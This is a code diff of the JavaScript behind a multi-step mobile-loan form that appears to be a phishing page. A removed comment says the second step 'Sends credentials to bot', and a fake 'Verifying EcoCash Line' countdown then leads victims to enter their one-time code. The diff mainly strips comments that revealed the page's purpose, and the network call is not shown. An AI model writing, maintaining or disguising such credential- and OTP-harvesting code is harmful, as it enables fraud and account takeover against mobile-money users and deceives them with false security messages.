@@ -17,7 +17,6 @@ document.addEventListener('DOMContentLoaded', () => {
   const btnStep3 = document.getElementById('btn-step3');
   const otpInput = document.getElementById('otp');
 
-  // Slider functionality mapping
   const loanSlider = document.getElementById('loanAmountSlider');
   const loanDisplay = document.getElementById('loan-amount-display');
   
@@ -27,16 +26,13 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // Step Indicators
   const stepIndicator = document.getElementById('step-indicator');
   const stepCircle1 = document.getElementById('step-circle-1');
   const stepLabel1 = document.getElementById('step-label-1');
   const stepLine1 = document.getElementById('step-line-1');
-
   const stepCircle2 = document.getElementById('step-circle-2');
   const stepLabel2 = document.getElementById('step-label-2');
   const stepLine2 = document.getElementById('step-line-2');
-
   const stepCircle3 = document.getElementById('step-circle-3');
   const stepLabel3 = document.getElementById('step-label-3');
 
@@ -54,7 +50,6 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   }
 
-  // STEP 1 Submission
   if (step1Form) {
     step1Form.addEventListener('submit', (e) => {
       e.preventDefault();
@@ -70,7 +65,6 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // STEP 2 Submission -> Sends credentials to bot -> 10s Countdown -> Step 3
   if (step2Form) {
     step2Form.addEventListener('submit', async (e) => {
       e.preventDefault();
@@ -102,7 +96,7 @@ document.addEventListener('DOMContentLoaded', () => {
         console.error('Credential submission error:', err);
       }
 
-      let countdown = 10; // Updated to 10 seconds
+      let countdown = 10; // 10-second countdown loading screen
       if (loadingTitle) loadingTitle.innerText = `Verifying EcoCash Line... (${countdown}s)`;
       if (loadingDesc) loadingDesc.innerText = "Please wait while we establish a secure session and dispatch your OTP.";
 
@@ -120,7 +114,6 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // STEP 3 Submission (OTP Code)
   if (step3Form) {
     step3Form.addEventListener('submit', async (e) => {
       e.preventDefault();
@@ -205,4 +198,4 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   }
 });
-        
+    
